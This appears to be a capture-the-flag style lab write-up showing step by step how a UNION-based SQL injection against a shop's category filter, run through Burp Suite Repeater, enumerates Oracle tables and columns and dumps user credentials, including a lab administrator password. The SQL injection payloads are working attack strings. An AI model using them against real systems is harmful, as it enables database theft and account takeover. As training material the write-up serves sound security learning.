---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 6
---

![1](https://github.com/Knign/Write-ups/assets/110326359/097e09a8-3611-44ad-8c63-4cdee0f5ac0c)

Let's filter for `Accessories`.

![2](https://github.com/Knign/Write-ups/assets/110326359/0ea53d5a-277e-4d72-a3eb-1aead2238d54)

Since we are proxying the traffic through Burp Suite, we can go to the `Proxy > HTTP History` tab to view this request.


Let's forward this request to the `Repeater` for further modification.

Once in the `Repeater`, let's set the `category` parameter to the following:

```
' UNION SELECT 'test' FROM dual--
```

![4](https://github.com/Knign/Write-ups/assets/110326359/4c2de013-63ad-4250-9d58-132cf7b99bd1)

Since the application returns an error, we know that the number of columns in the current query is more than 1.

Let's set the `category` parameter to the following:

```
' UNION SELECT 'test', 'test' FROM dual--
```

![5](https://github.com/Knign/Write-ups/assets/110326359/11d7a47e-8762-4bf1-8094-2ae800bc1515)

Now that we know the current query has two columns, we can start enumerating the tables.

```
' UNION SELECT table_name, NULL FROM all_tables--
```

![6](https://github.com/Knign/Write-ups/assets/110326359/9e7cb098-497e-4323-92aa-aed45433158b)

Next, we need to find the columns present in the `USERS_EABGJF` table.

We can do that by setting the `category` parameter to the following:

```
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_EABGJF'--
```

![7](https://github.com/Knign/Write-ups/assets/110326359/0d024248-6cde-4535-a7a6-cebd2d18a213)

We can now retrieve the usernames and password from the `USERNAME_LIVOZB` and `PASSWORD_XJPXQQ` columns respectively.

For that we have to set the `category` parameter to the following:

```
' UNION SELECT USERNAME_LIVOZB, PASSWORD_XJPXQQ FROM USERS_EABGJF--
```

![8](https://github.com/Knign/Write-ups/assets/110326359/959d1a57-c6a4-451d-8eab-ca633d6fcb94)

We can now login as the administrator using the following credentials:

| Username | Password |
| -------- | -------- |
| administrator         | ayzzulz0enewtllx1szu         |

![9](https://github.com/Knign/Write-ups/assets/110326359/19c90da4-19dc-4d5f-8dd5-0c91f2366e30)

We have solved the lab

![10](https://github.com/Knign/Write-ups/assets/110326359/2a37599b-f7ee-45f3-af07-e35b06fef02d)
